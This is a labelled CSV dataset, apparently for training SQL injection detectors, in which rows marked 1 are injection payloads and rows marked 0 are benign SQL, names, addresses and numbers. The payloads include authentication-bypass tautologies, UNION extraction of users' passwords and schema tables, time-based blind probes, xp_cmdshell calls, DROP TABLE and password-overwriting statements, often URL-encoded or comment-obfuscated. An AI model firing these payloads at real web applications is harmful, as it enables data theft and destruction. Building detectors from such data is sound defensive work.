Sentence,Label
"""/**/OR/**/1=1-- OR 1=1/*857470924140373",1
1'; WAITFOR DELAY '00:00:010'--866-- AND 1=1429462,1
SELECT pass FROM rise,0
"""%20or%201=1/*835/*#442316",1
'+or+1=1# OR 1=1 AND 1=1 OR 1=1--175,1
' OR '2'='2277272730,1
"1'%20UNION%20SELECT%20NULL,table_name%20FROM%20information_schema.tables--408298-- AND 1=1",1
SELECT AVG ( extra ) FROM plant SELECT SUM ( possible ) ,0
admin' OR 1=1/*## OR 1=1 OR 1=131567,1
"""/**/AND/**/extractvalue(1,concat(0x7e,version()))---- AND 1=1302909",1
"test' UNION SELECT NULL,NULL-- AND 1=1/*",1
6819240000000000,0
"  SELECT * FROM outside WHERE nervous IN  ( 'aware', 'cut', 'all' )  ",0
huyente,0
""")+OR+(""1""=""1 AND 1=1875 AND 1=1",1
54180440f,0
brihuega,0
"admin"" OR ""1""=""1"" /* AND 1=1452900",1
SELECT MIN ( wish )  AS wolf FROM ear,0
' OR 99=99# OR 1=1/*,1
tabanera de cerrato,0
SELECT TOP 3 * FROM full,0
';%09EXEC%09xp_cmdshell('dir')---- AND 1=1887639674,1
"INSERT INTO usually ( living, everything, story, opinion, tape, scientific )  VALUES  ( 'chain', 'journey'. deer', 'frozen', 'shallow', 'shake', 'age' )  ",0
1571430000000000,0
'%20OR%201=1/*--,1
11' OR 1 = 1/*--479,1
'+or+1=1# OR 1=1 AND 1=1 OR 1=1-- AND 1=1,1
"admin"" UNION SELECT NULL-- AND 1=1#645/*735 AND 1=1#584",1
1%2527%2520AND%2520BENCHMARK%25285000000%252CMD5%2528%2527A%2527%2529%2529--309202,1
'%09UNION%09ALL%09SELECT%09NULL--/*/*264,1
45699398p,0
jose cadalso s/n 7d,0
SELECT * FROM food WHERE lips NOT BETWEEN 'ordinary' AND 'mix',0
"user"" UNION SELECT NULL----#543",1
96to3a38,0
"admin"") OR (""1""=""1# OR 1=1601 AND 1=1815#64",1
mario caraball,0
admin%27%20OR%20%271%27%3D%27120 AND 1=140892,1
SELECT * FROM curve 3 SELECT * FROM water,0
ayoroa,0
"11' UNION SELECT NULL,table_name FROM information_schema.tables--/*--/*481477843",1
' OR 'a'='a839826953,1
"' AND 1=CONVERT(int,(SELECT @@version))-- AND 1=1953--#423285",1
'/**/OR/**/'1'='1'/**/--282#/*,1
"test"" UNION SELECT NULL,NULL--/* AND 1=1/*/*--",1
admin0x27/*467468#,1
"test' UNION SELECT 1,2,3--/*#974 OR 1=1164387",1
SELECT * FROM limited FETCH FIRST 3 ROWS ONLY,0
"test"" OR 1=1##933102/*360 AND 1=1",1
" SELECT * FROM whom ORDER BY clearly, element",0
SELECT * FROM kept WHERE ability BETWEEN '1996-07-01' AND '1996-07-31',0
1'%20OR%201%20=%201575409713--#,1
'%20or%201=1--969 OR 1=1/*215 OR 1=1786810,1
2' OR '2' = '2163254#820 AND 1=1,1
1admin' OR 1=1-- AND 1=1666#,1
8720000000000001,0
"'%09UNION%09SELECT%09NULL,NULL--21500 OR 1=1252",1
'/**/OR/**/'1'='1'/**/--/*75157 OR 1=1408,1
SELECT TOP 50 PERCENT * FROM strip SELECT * FROM fifteen FETCH FIRST 50 PERCENT ROWS ONLYSELECT TOP 3 * FROM early,0
"SELECT post_id, meta_key, meta_value FROM wp_postmeta WHERE post_id IN  ( 195 )  ORDER BY meta_id ASC",0
%2527%2529%2520OR%2520%2528%25271%2527%253D%25271--# OR 1=1591,1
SELECT AVG ( gravity ) FROM fence SELECT SUM ( largest ) ,0
sanabria,0
"useradmin"" OR ""1""=""1-- OR 1=112596",1
admin' OR 1=1#/*120637/*/*,1
admin'/**/OR/**/1=1-- OR 1=140262 OR 1=1,1
1' OR '1'='1' --/*#8,1
' OR '1'='1#724,1
"admin""/**/OR/**/1=1-- OR 1=1 OR 1=1756/*251--",1
'%20or%201=1--969 OR 1=1/*215 OR 1=1786#,1
"senda buen paso s/n,",0
admin' UNION SELECT NULL-- AND 1=1#645/*735 AND 1=1/*476860/*#,1
"99'; INSERT INTO users VALUES('hacked','pass')--372816#190",1
"user' UNION SELECT username,password FROM users----506 OR 1=1",1
"99"" AND BENCHMARK(5000000,MD5(""A""))-- OR 1=1 OR 1=1#",1
SELECT thou ( s FROM together RIGHT JOIN,0
"calle manzanilla 141,",0
aDMin'/* OR 1=1/*#392#,1
1' OR '1' = '1 AND 1=1566 OR 1=1 OR 1=1#/*,1
"   SELECT book,field,front,size,it     (  (  such JOIN forty ON program.movie =  club.equipment )   INNER JOIN oldestON Orders.favorite =  tent.thoseID ) ",0
"99"" OR 99 = 99 OR 1=1#/*5987",1
"1"" OR ""1"" = ""1 AND 1=1742395401--",1
"1' UNION SELECT NULL,NULL,NULL-- OR 1=1",1
73107657h,0
admin1' OR '1' = '1--279# AND 1=1 OR 1=1101,1
demetrio,0
1' UNION SELECT NULL----395993,1
SELECT COUNT ( couldID ) FROM rocket,0
admin' UNION SELECT NULL-- AND 1=1#645/*735909--/*,1
"1"" OR ""1""=""1"" --#57 OR 1=1695",1
"99"" AND BENCHMARK(5000000,MD5(""A""))-- OR 1=1878/*--",1
""";+EXEC+xp_cmdshell(""dir"")--## AND 1=1--314",1
"'%20UNION%20SELECT%20NULL,NULL,NULL--511138/*81465",1
"   SELECT COUNT ( them ) , solid FROM card BY author",0
"""+UNION+SELECT+NULL--608861",1
SELECT * FROM large WHERE own BETWEEN '1996-07-01' AND '1996-07-31',0
SELECT * FROM lead WHERE spent BETWEEN friendly09/01/1996pleasure AND climate15/31/1996did,0
"SELECT * FROM Users WHERE Name  = ""John Doe"" AND Pass  = ""myPass""",0
' or 1=1--73392,1
%27%20UNION%20SELECT%20username%2Cpassword%20FROM%20users--# AND 1=1--246--,1
"99'; INSERT INTO users VALUES('hacked','pass')-- OR 1=1-- OR 1=1#194",1
SELECT * FROM tin FETCH FIRST 3 ROWS ONLY SELECT TOP 50 PERCENT * FROM lunch,0
fuente el saz,0
1' UNION SELECT NULL----395628168,1
SELECT AVG ( once ) FROM giant SELECT SUM ( slightly ) ,0
user1' OR '1' = '1659 AND 1=1,1
';%20EXEC%20xp_cmdshell('dir')--591 AND 1=1108/*##48-- AND 1=1226,1
"useradmin"" OR 1=1--#572 OR 1=1127",1
user' UNION SELECT NULL--368,1
"1"" AND SLEEP(10)--709",1
"'/**/UNION/**/SELECT/**/NULL,NULL,NULL--306210",1
"""+OR+1=1#/*#--",1
SELECT COUNT ( mind ) FROM except,0
SELECT * FROM torn WHERE feathers = 'count'  OR today = 'rule',0
""";+EXEC+xp_cmdshell(""dir"")-- AND 1=1 AND 1=1/*228",1
""";%20EXEC%20xp_cmdshell(""dir"")--# AND 1=1202/* OR 1=1791301850",1
"admin' UNION SELECT 1,2,3----811-- OR 1=1--282313",1
2969,0
'%20or%201=1#/*##,1
SELECT finest ( s )  FROM policeman,0
admin' OR 1=1/*,1
admin') OR 1=1--# AND 1=1 AND 1=1,1
"admin"") OR (""1""=""1# OR 1=1601 AND 1=1815 OR 1=1--",1
57584234p,0
' OR '2'='2 OR 1=1468 OR 1=1,1
""" AND extractvalue(1,concat(0x7e,version()))--161272744387",1
"admin""#640",1
test' UNION SELECT NULL----/*--/*55,1
"test1"" OR ""1"" = ""1/*# AND 1=1-- OR 1=1 OR 1=1",1
1' AND pg_sleep(5)--/*,1
"admin"" UNION SELECT NULL,NULL,NULL---- AND 1=1226774",1
"testadmin"" OR ""1""=""1 AND 1=1613186#218616",1
leocricia,0
69441548v,0
user1' OR 1 = 1--,1
admin' UNION SELECT NULL----607#--907,1
SELECT see ( s )  FROM breathing LEFT JOIN,0
SELECT TOP 3 * FROM forty SELECT * FROM movie 3SELECT * FROM like,0
"""; DROP TABLE users--",1
"admin' UNION SELECT NULL,NULL--897514154 OR 1=1368",1
"' UNION SELECT NULL,NULL,NULL--/*/*",1
"passatge credit, 93, 13-c",0
1'%20AND%20pg_sleep(5)--636189--,1
""" AND extractvalue(1,concat(0x7e,version()))-- OR 1=1278583236 OR 1=1776",1
artigas girut,0
admin0x27/* OR 1=1 AND 1=1298372,1
"1"" UNION SELECT NULL,NULL------611--306493# AND 1=1",1
"test"" OR 1=1##933102#/*986391",1
SELECT COUNT ( facing )  FROM gray,0
"1'; INSERT INTO users VALUES('hacked','pass')--739##375 AND 1=1 OR 1=1946",1
SELECT * FROM person  WHERE feathers = solid,0
"1""; INSERT INTO users VALUES(""hacked"",""pass"")-- OR 1=1 AND 1=1#/*",1
5854370000000000,0
') OR ('1'='1--,1
"1"" OR ""1""=""1"" --#57 OR 1=165",1
admin' OR 1=1-- AND 1=1173228,1
"1""%20UNION%20SELECT%20NULL,column_name%20FROM%20information_schema.columns-- OR 1=1 OR 1=1",1
"admin"" OR ""1""=""1"" /* AND 1=1452900178",1
testadmin' OR '1'='1 AND 1=1 OR 1=1 OR 1=1/* AND 1=1/*--718,1
"user"") OR 1=1-- AND 1=1882350307#--",1
'/**/OR/**/1=1-- OR 1=1 AND 1=1 OR 1=1974,1
"1"" OR ""1""=""1/* AND 1=1 OR 1=1/* OR 1=1497420",1
"doctor diego madrazo, 180",0
pearce,0
"1';+INSERT+INTO+users+VALUES('hacked','pass')--517695",1
SELECT * FROM widely WHERE offer = 'interior' FETCH FIRST 3 ROWS ONLY,0
admin' OR '1'='1 AND 1=1998826591,1
2' AND SLEEP(5)--#669884,1
'+OR+'1'='1--549 OR 1=1997,1
"""+OR+1=1----966816",1
"SELECT post_id, meta_key, meta_value FROM wp_postmeta WHERE post_id IN  ( 28450 )  ORDER BY meta_id ASC",0
"SELECT post_id, meta_key, meta_value FROM wp_postmeta WHERE post_id IN  ( 30710 )  ORDER BY meta_id ASC",0
"99"" OR 99 = 99",1
"  SELECT * FROM mail WHERE human NOT IN  ( 'particles', 'porch', 'colony' )  ",0
"1' UNION SELECT 1,2,3--/*/*",1
"1' UNION SELECT 1,2,3-- AND 1=1--589596",1
"useradmin"" OR ""1""=""1-- OR 1=1125737 AND 1=1",1
"test1"" OR ""1"" = ""1/*# AND 1=1--631274268",1
"test"" UNION SELECT 1,2,3--/*10 AND 1=1# AND 1=1515 AND 1=1",1
gupton,0
"   SELECT pour, maybe, balloonFROM halfway WHERE month  IS NOT NULL",0
"1'+UNION+SELECT+NULL,column_name+FROM+information_schema.columns-- OR 1=1",1
9270,0
1' OR '1'='1' --#57/*146--,1
' OR '1'='1#474#--,1
SELECT * FROM clock WHERE Price NOT BETWEEN 10 AND 20,0
SELECT creature FROM pole UNION ALL SELECT involved FROM slip ORDER BY want,0
"admin' UNION SELECT username,password FROM users-- AND 1=1 OR 1=1978----",1
"calle prat de la riba, 73",0
SELECT MIN ( partly )  AS usually FROM combination,0
genestar llufriu,0
"admin' UNION SELECT NULL,NULL--#122619423",1
"admin1"" OR ""1"" = ""1--/*737#594",1
"1'; INSERT INTO users VALUES('hacked','pass')--739##",1
"1'%09UNION%09SELECT%09NULL,column_name%09FROM%09information_schema.columns--600672",1
' OR '2'='213/*##,1
"99"" AND BENCHMARK(5000000,MD5(""A""))-- OR 1=1878314",1
user' OR 'a'='a--920,1
462514000000000,0
"admin' UNION SELECT username,password FROM users-- AND 1=1 OR 1=1 AND 1=160827----",1
"torre de esteban hambrn, la",0
"  SELECT colorID AS ID, identity AS hay FROM date",0
ADMIN'/* AND 1=191156 OR 1=1,1
6908400000000000,0
""";+EXEC+xp_cmdshell(""dir"")-- AND 1=1--247810561852",1
SELECT * FROM public WHERE hung = 'return'  OR had = 'oldest',0
"'%20UNION%20SELECT%20NULL,NULL,NULL--511138##401754",1
" SELECT * FROM missing ORDER BY string, along",0
SELECT * FROM  ( SELECT hand FROM situation ) ,0
"""%09UNION%09ALL%09SELECT%09NULL--477/*-- AND 1=1 AND 1=1785",1
SELECT * FROM too WHERE similar LIKE '%material%',0
"user"") OR 1=1-- AND 1=1882350307465 AND 1=1255",1
"""%09UNION%09SELECT%09NULL,NULL--21500 OR 1=1 OR 1=1403",1
lauriaul,0
ADMIN'/*826/* AND 1=1,1
SELECT * FROM social FETCH FIRST 50 PERCENT ROWS ONLY,0
""";+EXEC+xp_cmdshell(""dir"")--## AND 1=1--743#",1
SELECT * FROM harbor FETCH FIRST 50 PERCENT ROWS ONLY,0
SELECT * FROM appearance WHERE away = 'beyond'  AND City = 'saddle',0
 UPDATE above SET try = 'stand'WHERE silly = 'society',0
admin' OR 1=1/*--863 AND 1=1 AND 1=1673/*,1
"  SELECT Orders.fireplacerID, Employees.captain, Employees.seed FROM OrdersRIGHT JOIN Employees ON Orders.EmployeeID  =  Employees.forID ORDER BY Orders.slowID",0
"admin"" UNION SELECT NULL,NULL,NULL--/*393234",1
1' OR '1'='1' --/*#386,1
"1"" UNION SELECT username,password FROM users--652576",1
2' OR '2' = '2163254#520,1
"ruiz de alda, 78",0
SELECT region ( s ) FROM aware INNER JOIN,0
' AND 1=CAST((SELECT @@version) AS int)--/*3,1
"SELECT * FROM highest WHERE locate BETWEEN ""house"" AND    ""onto""",0
"alqueria de pixarroda, 27",0
"' UNION SELECT NULL,NULL,NULL--24179#",1
'/**/OR/**/1=1-- OR 1=1 OR 1=1# AND 1=1780,1
"""%09UNION%09SELECT%09NULL,NULL--21500 OR 1=1 OR 1=1799350828",1
"1""; INSERT INTO users VALUES(""hacked"",""pass"")----679",1
wieth@camiones-hibridos.md,0
ADMIN'/*--672--#,1
'%20or%201=1#715,1
fady,0
'%20or%201=1--969 OR 1=1 AND 1=1827,1
"""%09UNION%09ALL%09SELECT%09NULL--477/*-- AND 1=1227",1
1'/**/AND/**/SLEEP(5)-- OR 1=1,1
SELECT * FROM tone WHERE swimming = 'rapidly'  AND City = 'huge',0
1' OR '1'='1' --#412640937,1
"""%20UNION%20ALL%20SELECT%20NULL--908#565393383799",1
SELECT AVG ( agree ) FROM within,0
SELECT fur FROM require UNION ALL SELECT gentle FROM weigh ORDER BY naturally,0
admin' OR 1=1-- OR 1=1330,1
SELECT town ( s )  FROM whom UNION,0
"admin"" UNION SELECT NULL,NULL--181885 AND 1=182",1
1' OR '1' = '1 AND 1=1566 OR 1=1 OR 1=1## OR 1=1,1
admin'/**/OR/**/1=1-- OR 1=1 OR 1=1756710 AND 1=1,1
"test"" UNION SELECT NULL,NULL--/*978558155/*",1
"' UNION SELECT username,password FROM users--/* OR 1=1",1
1' OR '1'='1' --#57 OR 1=1901 OR 1=1--,1
%27%20UNION%20SELECT%20NULL--474,1
test' OR '1'='1' --714631/*,1
"test"" UNION SELECT 1,2,3--/*10 AND 1=1 AND 1=1481",1
"""%20AND%201=CAST((SELECT%20@@version)%20AS%20int)--",1
admin%27%20OR%20%271%27%3D%27120 AND 1=1372,1
10x27; WAITFOR DELAY 0x2700:00:050x27---- OR 1=1394 AND 1=1,1
1' OR 'a'='a544#-- OR 1=1283,1
admin%27%20OR%20%271%27%3D%27120 AND 1=140868/*507,1
"1""%20UNION%20SELECT%20NULL,column_name%20FROM%20information_schema.columns-- OR 1=1 OR 1=1/* OR 1=1--",1
"'/**/AND/**/1=CONVERT(int,(SELECT/**/@@version))--# AND 1=168809",1
admin1' OR '1' = '1--279# AND 1=1#,1
SELECT * FROM torn  WHERE zoo NOT LIKE '[dead]%',0
""" AND extractvalue(1,concat(0x7e,version()))--161/*788318757",1
"'/**/UNION/**/SELECT/**/NULL,NULL,NULL--306-- AND 1=1",1
"1'/**/UNION/**/SELECT/**/NULL,table_name/**/FROM/**/information_schema.tables--593",1
""" UNION ALL SELECT NULL--#/* AND 1=1 AND 1=1",1
"test' UNION SELECT username,password FROM users--/*#614",1
'/**/OR/**/1=1-- OR 1=1876--/*----,1
SELECT COUNT ( cloud ) FROM already,0
"'%09UNION%09SELECT%09NULL,NULL--21500 OR 1=1 OR 1=1799",1
10x27 AND SLEEP(5)--,1
ADMIN'/* AND 1=1#,1
"user"") OR (""1""=""1 OR 1=1 AND 1=1/*584",1
"""/**/OR/**/1=1-- OR 1=1876--/*--417--",1
"useradmin"" OR 1=1--#142",1
""";+EXEC+xp_cmdshell(""dir"")-- AND 1=1--247810561217",1
"1"" OR ""1""=""1/* AND 1=1 OR 1=1/* OR 1=1659--282 AND 1=1251",1
1'%09OR%09'1'%09=%09'1998468,1
"user"" UNION SELECT NULL--/*58370 AND 1=1442",1
"1"" UNION SELECT NULL,NULL------611-- OR 1=1 AND 1=1",1
'/**/OR/**/'1'='1'/**/--558,1
';%20WAITFOR%20DELAY%20'0:0:5'--699,1
user' OR 'a'='a----147,1
SELECT * FROM anyone 3 SELECT * FROM base,0
'+OR+'1'='1'+/*,1
') OR ('1'='1/* OR 1=1--/* AND 1=111310,1
1'%20OR%201%20=%201 OR 1=1 OR 1=1,1
ADMIN'/*--458,1
lagata,0
SELECT * FROM steam WHERE relationship  BETWEEN 10 AND 20,0
') OR ('1'='1/* OR 1=1--/*36,1
"1""; INSERT INTO users VALUES(""hacked"",""pass"")--739 AND 1=1 OR 1=1",1
1'%09AND%09pg_sleep(5)--860 OR 1=1258769,1
' AND 2=CAST((SELECT @@version) AS int)--#373,1
"' UNION SELECT NULL,NULL--/*",1
9.84215E+015,0
"admin"" UNION ALL SELECT NULL-- AND 1=1-- OR 1=1",1
"test"" UNION SELECT NULL,NULL--/*978558655923",1
SELECT TOP 3 * FROM brief WHERE monkey = 'changing',0
"99"" OR 99 = 99 OR 1=1#570",1
admin' UNION ALL SELECT NULL-- AND 1=111/*447,1
1' OR '1'='1' --/* OR 1=1--#,1
1' OR '1'='1' --#,1
' or 2=2/* AND 1=1623,1
SELECT rising ( s )  FROM condition SELECT development ( s ) ,0
') OR ('1'='1/* OR 1=1/* OR 1=1 OR 1=1346 AND 1=1576,1
SELECT * FROM steady WHERE dug BETWEEN entire09/01/1996several AND body15/31/1996union,0
"admin"" UNION SELECT NULL,NULL,NULL--/*517 OR 1=1",1
SELECT * FROM press WHERE break = 'map' FETCH FIRST 3 ROWS ONLY,0
"admin' UNION SELECT 1,2,3----811-- OR 1=1--944",1
SELECT knew ( s )  FROM know SELECT darkness ( s ) ,0
1'; WAITFOR DELAY '00:00:010'--866-- AND 1=1/*,1
%2527%2520OR%25201%253D1/%252A--4 OR 1=1--,1
user' UNION SELECT NULL-- AND 1=14321,1
admin%27%20OR%20%271%27%3D%27120 AND 1=1 OR 1=1,1
"test' UNION SELECT username,password FROM users--/*#/*##",1
SELECT * FROM compound WHERE little = 'itself' FETCH FIRST 3 ROWS ONLY,0
tesisteco avi,0
"test"" UNION SELECT NULL----",1
'%20or%201=1/*835257/* OR 1=1/*250661,1
SELECT * FROM shelf WHERE ever BETWEEN '1996-07-01' AND '1996-07-31',0
traveria morera,0
'%09UNION%09ALL%09SELECT%09NULL--/*/*/*,1
SELECT AVG ( raw ) FROM bigger SELECT SUM ( volume ) ,0
"'%09UNION%09SELECT%09NULL,NULL--21776 OR 1=1",1
SELECT TOP 3 * FROM actual SELECT * FROM moving 3SELECT * FROM plate,0
' OR '2'='213973 AND 1=1--53-- AND 1=1464,1
"""/**/AND/**/extractvalue(1,concat(0x7e,version()))--662",1
user') OR 1=1-- AND 1=1325 AND 1=167#643616,1
2' AND SLEEP(5)--76181697--,1
SELECT part ( s )  FROM cannot LEFT JOIN,0
"99""; INSERT INTO users VALUES(""hacked"",""pass"")--372816#47",1
' OR '1'='1' /*#--416,1
ADMIN'/* AND 1=1--784 OR 1=1,1
"admin1' UNION SELECT NULL,table_name FROM information_schema.tables--813968#753",1
"   SELECT tall, desert, market FROM soap WHERE depth  IS NULL",0
"admin' UNION SELECT NULL,NULL,NULL---- AND 1=198256541208",1
SELECT * FROM command WHERE north = 'ear',0
' OR 1=1#---- OR 1=1844 AND 1=1,1
"   SELECT A.CustomerName AS CustomerName1, B.CustomerName AS CustomerName2,    A.CityFROM Customers A, Customers BWHERE A.CustomerID <> B.CustomerID  AND A.City  =  B.City ",0
sorbello8@carrillo-de-albornoz.jobs,0
2' OR '2' = '2163254619173619,1
admin' UNION ALL SELECT NULL-- AND 1=1474956,1
') OR ('1'='1/* OR 1=1293408774,1
"  SELECT circusID AS ID, suit AS rope FROM mile",0
"""%20or%201=1# AND 1=1 OR 1=1447847695",1
"'/**/AND/**/1=CONVERT(int,(SELECT/**/@@version))--138/*-- AND 1=1323",1
'; ExeC XP_cmdSheLl('Dir')----353,1
user1' OR '1' = '1659--265,1
SELECT * FROM dangerous WHERE tears = 'sure' FETCH FIRST 3 ROWS ONLY,0
"test"" UNION SELECT NULL,NULL--/* AND 1=1773",1
SELECT TOP 3 * FROM announced WHERE bush = 'fireplace',0
"SELECT post_id, meta_key, meta_value FROM wp_postmeta WHERE post_id IN  ( 21 )  ORDER BY meta_id ASC",0
user1' OR 1 = 1--386,1
admin1' OR 1 = 1 AND 1=1-- AND 1=1241,1
oficios$o,0
howe1,0
"'%20UNION%20SELECT%20NULL,NULL,NULL----/*",1
37210,0
"admin"" UNION ALL SELECT NULL--24127474161427 AND 1=1",1
user') OR ('1'='1--#--488,1
SELECT * FROM grandmother WHERE during LIKE '%blind%',0
becilla de valderaduey,0
SELECT * FROM beginning WHERE many = 'wheat'  AND City = 'goose',0
SELECT * FROM join WHERE off IN  ( SELECT wait FROM printed ) ,0
2' AND SLEEP(5)--#669428,1
SELECT * FROM neighborhood WHERE teeth IN  ( SELECT island FROM warm ) ,0
%27%20UNION%20SELECT%20NULL--52960,1
'/**/or/**/1=1/*135540--/*,1
'%20or%201=1/*835 OR 1=1#,1
1' OR 'a'='a544#80572,1
SELECT bell ( s )  FROM only LEFT JOIN,0
"' AND 1=CONVERT(int,(SELECT @@version))-- AND 1=1953--#423",1
"admin"" UNION SELECT NULL,NULL,NULL--/*315",1
"  SELECT fifth,split,stream FROM member LEFT JOIN Orders ON together.additionalID =  sad.small ORDER BY copy.gray",0
"1"" OR 1=1/*#/*",1
"1"" UNION SELECT NULL----159334593107 AND 1=1196",1
admin' OR 1=1#/*471/*,1
"test"" UNION SELECT NULL----#261",1
"""+UNION+SELECT+NULL--608861273--",1
admin'%20OR%20'1'='1 AND 1=1987--,1
test1' OR 1 = 1# OR 1=1-- AND 1=1,1
user' OR 1=1# AND 1=1 AND 1=1962,1
"test1"" OR ""1"" = ""1/*#882",1
"useradmin"" OR 1=1--#572/*-- OR 1=1#371",1
massaguer molin,0
pontevedra,0
"test1"" UNION SELECT NULL,table_name FROM information_schema.tables-- AND 1=1----659",1
admin0x27/*58763/*,1
1%27%3B%20DROP%20TABLE%20users--/*586 AND 1=1 OR 1=1348154600,1
'/**/OR/**/'1'='1'/**/-- OR 1=1575612,1
SELECT * FROM although WHERE manner BETWEEN '1996-07-01' AND '1996-07-31',0
SELECT consonant ( s )  FROM firm,0
"user"") OR (""1""=""1 AND 1=1626468956640",1
"testadmin"" OR ""1""=""1#624 OR 1=1",1
r2s058ada,0
"'%09UNION%09SELECT%09username,password%09FROM%09users----/* OR 1=1",1
SELECT direct FROM church,0
""" OR 1=1#----# AND 1=1-- AND 1=1876966",1
"'%09UNION%09SELECT%09username,password%09FROM%09users----/*",1
test') OR ('1'='1-- AND 1=1939,1
37655511a,0
"1'; INSERT INTO users VALUES('hacked','pass')--739#897",1
"admin""/**/OR/**/1=1-- OR 1=1 OR 1=1756/*#",1
recabdador,0
0x27; UPDATE users SET password=0x27hacked0x27--695--,1
"   SELECT sound, pleasure, you FROM surface WHERE strength  IS NULL",0
"' union select null,null,null--## AND 1=1",1
SELECT AVG ( Price ) FROM seeing,0
19332,0
"SELECT ProductName, UnitPrice *  ( UnitsInStock + COALESCE ( UnitsOnOrder, 0  )  )   FROM Products;",0
1'----10178,1
"1""+OR+1+=+1415",1
SELECT * FROM  ( SELECT degree FROM hand ) ,0
"' AND 1=CONVERT(int,(SELECT @@version))-- AND 1=1953--# OR 1=1159--",1
"""/**/OR/**/""1""=""1""/**/--282",1
SELECT * FROM birthday WHERE all = 'party' LIMIT 3,0
"test"" OR 1=1##933102/*344",1
1' OR '1' = '1 AND 1=1 AND 1=1 AND 1=1,1
contrapalanqun,0
1' OR '1' = '1 AND 1=1566 OR 1=124,1
"' UNION SELECT username,password FROM users-- OR 1=1498",1
"""%09UNION%09ALL%09SELECT%09NULL--477/*--111",1
admin' OR 1=1#/*#/*,1
user') OR 1=1-- AND 1=1325 AND 1=167#460,1
afoscarse,0
admin0x27/*467468 OR 1=1708295,1
"1"" and pg_sleep(5)--570",1
"admin' UNION SELECT 1,2,3----811--#",1
' OR '1'='1' /* AND 1=1,1
""" OR 1=1#----# AND 1=1-- AND 1=1 AND 1=1--",1
' OR '2'='2 AND 1=1 AND 1=1--173--913464,1
"admin1' UNION SELECT NULL,table_name FROM information_schema.tables--813968#",1
97925933y,0
"admin' UNION SELECT NULL,NULL,NULL---- AND 1=198256541312",1
SELECT * FROM should WHERE test IN  ( SELECT pig FROM exclaimed ) ,0
"admin' UNION SELECT username,password FROM users-- AND 1=1 OR 1=1978 AND 1=1",1
"admin' UNION SELECT NULL,NULL--#122 OR 1=1",1
0x27 OR 0x27a0x27=0x27a,1
"  SELECT * FROM replace WHERE subject IN  ( 'managed', 'past', 'name' )  ",0
'+OR+'1'='1-- AND 1=1 AND 1=1120,1
admin1' OR 1 = 1#,1
1' OR 'a'='a OR 1=1#38688/*186,1
18339,0
' or 1=1--73 AND 1=1,1
"  SELECT anyID AS ID, famous AS image FROM service",0
test1' OR 1 = 1# OR 1=1--836,1
"  SELECT protection AS court, exact AS [growth]  FROM but",0
"admin"" OR ""1""=""1 AND 1=1998-- AND 1=1850",1
SELECT TOP 50 PERCENT * FROM wait SELECT * FROM gather FETCH FIRST 50 PERCENT ROWS ONLYSELECT TOP 3 * FROM grown,0
SELECT COUNT ( DISTINCT hide )  FROM block,0
"admin' UNION SELECT NULL,NULL,NULL--/*# AND 1=1708",1
"test"" OR ""1""=""1/*#",1
"etorbidea nafarroa behereko, 162 6?d",0
' OR 1=1#-- OR 1=1#810437556,1
"'/**/AND/**/extractvalue(1,concat(0x7e,version()))--761--625 OR 1=1",1
SELECT COUNT ( improve )  FROM laugh,0
43774,0
"1"" UNION SELECT NULL,NULL------611--306 OR 1=1 OR 1=1",1
' OR 1=1#-- OR 1=1#473,1
SELECT * FROM safety FETCH FIRST 50 PERCENT ROWS ONLYSELECT TOP 3 * FROM powerful,0
'; UPDATE users SET password='hacked'--,1
"  SELECT BINARY ""HELLO""  =  ""hello"";",0
'%09OR%091=1--#738561,1
"' UNION SELECT NULL,NULL-- AND 1=1 OR 1=1189 OR 1=1 AND 1=1/*969",1
"1"" OR ""1""=""1/* AND 1=1 OR 1=1/* OR 1=1659--282 AND 1=1--",1
"c/ francisco de ricci 23, 1?c",0
' OR '1'='1#474 OR 1=1,1
"1'; INSERT INTO users VALUES('hacked','pass')--739##375 AND 1=1486",1
admin1' OR 1 = 1/*,1
arima@hormigon-impreso.nu,0
29385081m,0
"'%09UNION%09SELECT%09username,password%09FROM%09users----486 AND 1=1",1
""";+EXEC+xp_cmdshell(""dir"")-- AND 1=1 AND 1=1851",1
 UPDATE silly SET press = 'coach'WHERE manufacturing = 'fourth',0
"1'; INSERT INTO users VALUES('hacked','pass')--739-- OR 1=1518231 AND 1=164919",1
sprouse,0
"""%09UNION%09ALL%09SELECT%09NULL--477/*-- AND 1=1812 AND 1=1761",1
' OR '1'='1' --/*820,1
c/ mayolica 158 4a,0
SELECT * FROM south WHERE week BETWEEN nor09/01/1996apple AND growth15/31/1996thus,0
DELETE FROM dozen WHERE claws = 'work',0
21292,0
SELECT * FROM hungry FETCH FIRST 50 PERCENT ROWS ONLYSELECT TOP 3 * FROM range,0
""" OR ""2""=""213/*584164",1
vinaixa calleiros,0
"test' UNION SELECT 1,2,3-- AND 1=1512 AND 1=1760447",1
